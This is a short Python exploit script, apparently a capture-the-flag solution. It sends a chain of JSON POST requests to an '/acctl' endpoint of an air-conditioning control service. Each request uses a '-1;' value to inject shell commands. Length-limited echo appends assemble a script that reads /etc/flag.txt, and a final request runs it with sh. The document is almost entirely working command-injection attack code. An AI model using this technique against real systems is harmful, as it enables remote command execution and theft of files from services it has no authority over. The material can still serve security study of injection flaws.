#!/usr/bin/env python

import sys
import requests

if len(sys.argv) != 2:
    print("Usage: ./{} <ip:port>".format(sys.argv[0]))

server = sys.argv[1].strip().replace("http://", "").split("/")[0]


def format_json_req(temp, room, ac_id):
    return {'temp':temp, 'room':room, 'ac_id':ac_id}

commands_chain = \
[
    ["-1;", "echo", r"ca\\>>y "],
    ["-1;", "echo", r"t \\>>y "],
    ["-1;", "echo", r"/e\\>>y "],
    ["-1;", "echo", r"tc\\>>y "],
    ["-1;", "echo", r"/f\\>>y "],
    ["-1;", "echo", r"la\\>>y "],
    ["-1;", "echo", r"g.txt>>y"],
    ["-1;", "mv y", r"y.sh    "],
   #["-1;", "cat ", r"y.sh    "],
    ["-1;", "sh  ", r"y.sh    "],
]

ii = 1
for i in commands_chain[1][2]:
    print(ii, i); ii+=1

for cmd in commands_chain:
    print(format_json_req(cmd[0],cmd[1],cmd[2]), len(cmd[2]))
    r = requests.post("http://{}/acctl".format(server), json=format_json_req(cmd[0],cmd[1],cmd[2]))
    print(r.text)